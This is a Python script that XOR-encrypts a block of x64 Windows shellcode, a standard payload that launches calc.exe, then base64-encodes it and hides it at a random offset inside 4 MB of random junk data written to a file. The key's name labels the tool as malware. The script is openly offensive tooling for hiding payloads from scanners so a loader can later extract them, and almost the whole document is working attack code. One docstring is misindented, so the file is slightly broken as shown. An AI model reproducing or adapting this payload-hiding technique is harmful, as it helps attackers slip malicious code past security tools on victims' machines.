import os
import base64
import random

ENCRYPTION_KEY = b"NyXc0r_4dv4nc3d_M4lw4r3_2025_"

def encrypt_data(data):
    """XOR encryption with key bytes"""
    key_bytes = ENCRYPTION_KEY * (len(data) // len(ENCRYPTION_KEY) + 1)
    key_bytes = key_bytes[:len(data)]
    encrypted = bytes(a ^ b for a, b in zip(data, key_bytes))
    return base64.b64encode(encrypted).decode()

def generate_junk_with_encrypted_shellcode(shellcode_bytes, size_mb=4):
    """Generate junk data with encrypted shellcode"""
    target_size = size_mb * 1024 * 1024
    junk_data = bytearray()
    
    encrypted_shellcode = encrypt_data(shellcode_bytes)
    print(f"Encrypted shellcode size: {len(encrypted_shellcode)} bytes")
    
    insert_position = random.randint(target_size // 4, target_size // 2)
    
    while len(junk_data) < insert_position:
        junk_data.extend(os.urandom(random.randint(500, 2000)))
    
    junk_data.extend(encrypted_shellcode.encode())
    
    while len(junk_data) < target_size:
        junk_data.extend(os.urandom(random.randint(500, 2000)))
    
    return bytes(junk_data[:target_size])

def main():
  """Calc.exe for X64 Build"""
    shellcode = bytes([
        0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
        0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,
        0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,
        0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,
        0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,
        0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,
        0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,
        0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,
        0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,
        0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,
        0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,
        0x59,0x5A,0x48,0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,
        0x6F,0x87,0xFF,0xD5,0xBB,0xE0,0x1D,0x2A,0x0A,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,
        0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,0x47,
        0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x61,0x6C,0x63,0x2E,
        0x65,0x78,0x65,0x00
    ])
    
    output_dir = "../Data/"
    os.makedirs(output_dir, exist_ok=True)

    output_file = os.path.join(output_dir, "encrypted_shellcode_junk.dat")
    junk_data = generate_junk_with_encrypted_shellcode(shellcode, 4)
    
    with open(output_file, 'wb') as f:
        f.write(junk_data)
    
    file_size = os.path.getsize(output_file) / (1024 * 1024)
    print(f"Generated {file_size:.2f}MB junk file: {output_file}")
    print(f"Encryption Key: {ENCRYPTION_KEY.decode()}")

if __name__ == "__main__":
    main()
